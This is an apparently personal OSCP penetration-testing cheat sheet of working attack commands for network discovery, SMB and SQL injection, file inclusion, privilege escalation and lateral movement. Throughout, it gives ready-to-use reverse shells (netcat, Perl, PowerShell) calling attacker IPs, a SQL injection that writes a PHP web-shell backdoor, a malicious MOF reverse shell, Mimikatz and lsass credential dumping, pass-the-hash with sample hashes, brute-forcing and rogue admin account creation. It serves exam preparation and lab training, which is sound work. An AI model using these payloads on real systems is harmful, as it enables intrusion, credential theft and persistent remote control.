# OSCP
Stuff for OSCP...

## Discovery

- Host discovery TCP:   
   TOPTCP="$(grep -E "^[^#]*/tcp" /usr/share/nmap/nmap-services | sort -k 3nr | cut -f2 | cut -f1 -d/ | head -1000 | tr '\n' ',')"   
   nmap -n -sn --reason -PR -PE -PP -PM -PO -PY -PA -PS"$TOPTCP" -PU -iL targets.txt -oA nmap_host_discovery_arp_icmp_ip_sctp_tcp_udp   
   Add discovered hosts to textfile:   
   awk '/Up$/{ print $2 }' nmap_host_discovery_arp_icmp_ip_sctp_tcp_udp.gnmap | sort -V > targets_online.txt   
- Host discovery UDP:   
   grep -E "^[^#]*/udp" /usr/share/nmap/nmap-services | sort -k 3nr | cut -f2 | cut -f1 -d/ | head -100 > udp_ports   
   grep ^udp /usr/share/nmap/nmap-payloads | cut -d " " -f2 | tr , '\n' | sort -un >> udp_ports   
   grep -l -E "categories.*default" /usr/share/nmap/scripts/* | xargs grep -h -E "portrule.*udp" | grep -o -E "[0-9]+" >> udp_ports   
   UDPPORTS="$(sort -un udp_ports | tr '\n' ,)"   
   nmap -n -Pn --reason -sU -sC -p "$UDPPORTS" -iL targets.txt --excludefile targets_online.txt -oA nmap_host_discovery_udp_service_scan   
   Now add hosts with open UDP Ports to targets_online.txt:   
   kawk '/\/open\//{ print $2 }' nmap_host_discovery_udp_service_scan.gnmap  >> targets_online.txt   

- Full service scan on found hosts:
   nmap -n -Pn --reason -sS -sC -sV -p- -O -iL targets_online.txt -oA nmap_service_scan_tcp
 
- If you want only open ports without all the details:
   nmap -n -Pn --reason -sS -p- -iL targets_online.txt -oA nmap_service_scan_tcp

- start with less ports until full scan is done:
   nmap -n -Pn --top-ports 100 --reason -sS --min-hostgroup 128 --max-retries 1 --min-rate 500 --defeat-rst-ratelimit -iL targets_online.txt -oA nmap_SYN_scan_TCP_TOP_100

- NMAP Reports:
   https://github.com/maaaaz/nmaptocsv
   python nmaptocsv.py -x SMBClientScan.xml -f ip-port-protocol-service-version-os >> output.csv

- NMAP based OS Discovery:
   nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ipaddress>

## HTTP/HTTPS

- nikto -host $targetip -port $targetport
- ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $targetip -e php
- gobuster dir -e -k -w /usr/share/wordlists/dirb/common.txt -r -u https://www.example.com 
   gobuster with cookies: gobuster dir -e -k -w /usr/share/wordlists/dirb/common.txt -c 'connect.sid=s%3AEKo...jYluY; JSESSIONID=3asdasd889DF94A;' -r -u  https://somedomain.com




- Aquatone Installation:
   wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
   unzip aquatone_linux_amd64_*.zip -d /opt/aquatone/
   If google chrome is not yet installed:
   echo "deb [arch=amd64] https://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list
   wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
   apt-get update
   apt-get install google-chrome-stable
   Aquatone Usage:
   Collect data based on nmap report: cat nmap.xml | /opt/aquatone/aquatone -nmap -chrome-path /usr/bin/google-chrome -out screenshots -ports xlarge

- https://guif.re/webtesting
- https://sushant747.gitbooks.io/total-oscp-guide/common_web-services.html 

## SMB

- nmap -p 139,445 --script=smb-vuln* $targetip
- enum4linux -a $targetip
- smbclient \\\\$ip\\$share
- smbmap -H <IPAddress>
- nbtscan
- crackmapexec smb 10.11.1.1/24
- Try known creds on targets: crackmapexec smb 10.11.1.1/24 -u Administrator -p 99bbVDdorGzfZJun
- Bruteforcing: crackmapexec smb 10.11.1.1/24 -u /ville/Desktop/OSCP/PWK/users.txt -p /ville/Desktop/OSCP/PWK/pws.txt

## WinRM
- WinRM from Linux: https://github.com/Hackplayers/evil-winrm

## FTP

First check for anonymous access
- ftp $targetip
   Username: anonymous
   Password: anything

Path traversal: 
- ftp://10.11.1.125/../../../../windows/system32/wbem/logs/mofcomp.log

## DNS 
DNS Zone transfer lookup
host -l <domain> <nameserver IP address> (e.g.: host -l megacorpone.com 38.100.193.80)
this might provide additional information about the network, listing hostnames and ip addresses

## SSH
- "xxxx must be run from a terminal" --> spawn terminal:
   1) echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
   2) python /tmp/asdf.py
- SSH Tunnel (Source --> public ip 1.1.1.1 --> machine with private ip 2.2.2.2) to RDP to internal VM (2.2.2.2)
   ssh -l <username-on-1.1.1.1> (-i key.txt) -L 1337:2.2.2.2:3389 1.1.1.1
   afterwards you can RDP to the internal VM with: localhost:1337
- SSH Tunnel with SSHuttle:
   sshuttle -vr root@10.10.10.13 172.16.1.0/24 --ssh-cmd 'ssh -i sshloginkey.txt'
   Now all traffic to 172.16.1.0/24 will be sent to the tunnel

## SMTP
- check if user exists:
   nc -nv <ip address> 25
   VRFY <username>
   automate with bash:
   for user in $(cat users.txt); do echo VRFY $user | nc -nv -w 1 192.168.100.100 25 2>/dev/null | grep ^"250";done

## Exploits / Searchsploit

Update Searchsploit
- searchsploit -u

Search explot
- searchsploit $multiple $search $terms

## SQL Injection
- with saved request from burp: (-p is parameter, can be removed if you add * to the param in the request file)
   sqlmap -r request.txt -p objectid --risk 3 --level 5
- SQL Shell through UNION based SQL Injection in "TextBoxUsername" field:
   sqlmap -r request.txt -p TextBoxUsername --sql-shell --technique=U

MySQL 
- Enumerate tables:
   http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
- Get columns of specific table:
   http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
- Get content of table:
   http://10.11.14.101/comment.php?id=769 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
- Create new php file with cmd.exe:
   http://10.11.14.101/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
- Use the new page with params:
   http://10.11.14.101/backdoor.php?cmd=whoami

## File inclusion
- LFI: http://target.com/?page=home --> http://target.com/?page=./../../../../../../../../../etc/passwd%00
- RFI: http://target.com/?page=home --> http://target.com/?page=http://hackerip/evil.txt%00

## Reverse Shells
Linux:
- Pipe /bin/sh back to 10.0.0.1 port 1234
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f 
- More: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Windows:

- If Perl is running on Windows:
   perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
- nc.exe on Windows:
   nc.exe -e cmd.exe attackerip 1234
- PowerShell:
   powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

PHP:
- First modify the post request parameters to create a php file which executes the shell:
   q=test&lang=en' union select all 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/newbackdoor.php';#
   afterwards run the command to spawn a reverse shell:
   http://10.11.14.101/newbackdoor.php?cmd=c:\users\offsec\desktop\tools\netcat\nc.exe -nv 10.11.0.90 443 -e cmd.exe

## Info Gathering 
### Windows
- PS History: cat (Get-PSReadlineOption).HistorySavePath
- Get-ScheduledTask| % { $_.Actions}
- IIS App Pool Creds: (ls IIS:\AppPools | Get-ItemProperty -Include ProcessModel).ProcessModel | select UserName,Password

### Active Directory
- Query AD without PS AD Modules
   List Global Catalogs of a forest:
   PS> ([System.DirectoryServices.ActiveDirectory.Forest]::Getcurrentforest()).GlobalCatalogs
- User Enumeration
   https://github.com/sensepost/UserEnum

### Network
- run wireshark, save dump --> ./Pcredz -f dump.pcap
   or: sudo ./net-creds.py -p dump.pcap

## crackmapexec
- "hash spraying" (in this case with local administrator)
   cme smb 172.16.1.0/24 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04f --local-auth
- Share enumeration with credentials:
   cme smb 172.16.1.0/24 -u bill -p 'password' --shares


## File Transfer
### PowerShell
- Invoke-RestMethod -Uri $uri -Method Post -InFile $uploadPath -UseDefaultCredentials
- IEX ((New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"))

### netcat
- transfer files from kali to windows:
   1) open listener on target: nc -nlvp 4444 > incoming.exe
   2) send file to target:  nc -nv 10.0.0.22 4444 < /usr/share/windows-binaries/wget.exe
- transfer files from windows to kali:
   1) on Kali: nc -nlvp 4444 > file.txt
   2) on Windows: nc.exe -10.11.0.90 4444 < c:\users\bla\file.txt

### Impacket
- connect smbclient.py with hash: /usr/share/doc/python-impacket/examples/smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a Administrator@10.11.1.202
- get shares: shares
- upload something to c$:
   use C$
   put /var/www/html/transfer/nc.exe

### Download with SCP
- when having SSH key to remote target, download file with:
   scp -i mysshprivatekey user@10.10.10.10:/home/myuser/filename /home/folder/targetfilename

### SSH copy
- file: scp -p 192.168.1.100:/root/filetocopy targetfile
- directory: scp -r root@192.168.1.100:/var/log ~/backup-logs

### Others
- smbget -R smb://1.1.1.1/folder

## PrivEsc Windows
- Add new admin:
   net user /add [username] [password]
   net localgroup administrators [username] /add

- PS> IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
   PS> Invoke-AllChecks

If you have path traversal plus a location with write access you can exploit that with a malicious MOF file:
 1) generate MOF template with msf module "exploit/windows/smb/psexec":
      msf5 exploit(windows/smb/psexec) > irb
      puts generate_mof("Specialclass","ToOpenReverseShell")
 2) copy it to a MOF and replace the following line
    ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"ToOpenReverseShell\");}
    with:
    ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"nc -e cmd 10.11.0.90 9001\");}
 3) transfer the nc.exe to the targets C:\windows\system32
 4) start netcat listener on kali (same port as above in code!)
 5) transfer the MOF file: 
    put filename.mof ../../../../windows/system32/wbem/mof/Specialclass.mof
 --> This will provide you with a reverse shell!

## PrivEsc Linux
- 1) echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
   2) python /tmp/asdf.py

## Buffer Overflows etc.
### Patterns
- Create a unique pattern of 2700 byte:
   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
- locate a hex offset pattern:
   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438 -l 2700

### Badchars
- generate all possible hex chars: 
   cat badchars.py
   #!/usr/bin/python
   import sys
   for x in range(1,256):
   sys.stdout.write("\\x" + '{:02x}'.format(x))

## TCPDUMP 
- capture traffic from specific port:
   tcpdump -s 0 port ftp or ssh -i eth0 -w mycap.pcap
   tcpdump -s 0 port 3389 -i eth0 -w mycap.pcap

## Searching stuff
- search folder and subfolders for a string, output results and save results to file: 
   grep -ria @emaildomain.com /mnt/leaks_unpacked/ | tee /root/Desktop/85390/search_emaildomain.out
- get full path to file
   realpath key.pem
- Comparison: get all entries of file2 with are not already in file1:
   awk 'FNR==NR{a[$0]=1;next}!($0 in a)' file1 file2
- get all unique entries from multiple files and save them to new file:
   awk '!a[$0]++' folderwithfiles/* > uniqueentries.txt
- find all files with specific ending (recursive) and copy them to a target directory:
   find ./ -name "*.burp" -ls -exec cp {} /mnt/hgfs/transfer/targetfolder/ \;
   ./ --> means from the current directory and subfolders
   -exec --> with the results from the find command (being {} ), execute the following command
- get specific lines of nmap report, e.g. systems with specific port open:
   cat TCP-SYN-scan_11-06-19_02-45-50.txt | grep -E "Nmap scan report for|445/tcp open"
   cat nmap_SYN_scan_TCP_TOP_100.nmap | grep -E "Nmap scan report|open" | grep -B1 open
- If number of spaces between port and status is different: (Note: there is a space between the brackets!)
   cat TCP-SYN-scan_11-06-19_04-59-05.txt | grep -E "80/tcp[ ]+open" 
- Get last two regex occurences of string, e.g. to return only "domain.topleveldomain" from a long list which includes subdomains:
   grep -E "[A-Za-z0-9\-]+\.[A-Za-z0-9\-]+$" --color -o urls.txt | sort -u
- another method:
   cat domains.txt | rev | cut -d. -f 1-2 | rev
- get client IPs from apache access.log and group them: 
   cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn

## Pass-the-Hash techniques
- Dump creds with Impacket: secretsdump.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f
- open cmd.exe on remote target with known hash:
   /usr/share/doc/python-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a Administrator@10.11.1.202 cmd.exe
- Open remote connection with known hash using wmiexec:
   wmiexec.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f

## Mimikatz
- First Mimikatz commands:
  1) mimikatz # privilege::debug
  2) mimikatz # log sekurlsa.log
- logonpasswords:
   mimikatz # sekurlsa::logonpasswords
- other way:
   mimikatz # token::elevate
   mimikatz # lsadump::secrets
- Use minidump file:
   mimikatz # sekurlsa::minidump C:\WINDOWS\Temp\debug7962.bin
- PW Dump oneliner: mimikatz.exe privilege::debug sekurlsa::logonPasswords exit > output.txt
- Start shell with NTLM hash of user:
   mimikatz # sekurlsa::pth /user:admin-kiwi /domain:comp-internal /ntlm:cc36cf7a8514893efccd332446158b1a /run:cmd
- Possible attack sequence with metasploit:
   1) Run Metasploit's "hashdump" to get hashes: hashdump
   2) Start a process under the desired identity: mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:… /run:"powershell -w hidden"
   3) In Metasploit, abuse the security token of the just spawn process: steal_token 1234
   4) Do now whatever you want in metasploit with these privileges (e.g. list\\target\c$, upload and run binaries, perform WMIC commands, ...)
- Create minidump: (easiest with right click in taskmgr)
   procdump64.exe -accepteula -ma lsass.exe lsass.dmp
   Remote: psexec.py -c procdump64.exe 'example.com/username:P@ssw0rd@foobar.example.com' '-accepteula -ma lsass.exe c:\lsass.dmp'

## Bypass Applocker
- Bypass Applocker with mimilib.dll to run arbitrary executables:
   rundll32 c:\path\mimilib.dll,start d:\otherpath\a.exe

## Metasploit
- Multihandler:
   msf>use exploit multi/handler
   msf>set payload windows/meterpreter/reverse_tcp
   msf>set lhost <local IP>
   msf>set lport <local port>
   msf>set ExitOnSession false
   msf>exploit -j
- MSF Payload:
   msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.90 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
- Vuln Scanning with MSF:
   make sure db runs: db_status
   db_nmap -v -sV 10.11.1.35
   db_nmap -sS -Pn -A 10.11.1.35

## Linux RDP Client
- rdesktop -g 95% -u USER -p PASSWORD IP_ADDRESS

## Compiling
- Compiling a C program:
   gcc -static -mpreferred-stack-boundary=2 -o Shell ShellSpawn.c 
   gcc -o Shell ShellSpawn.c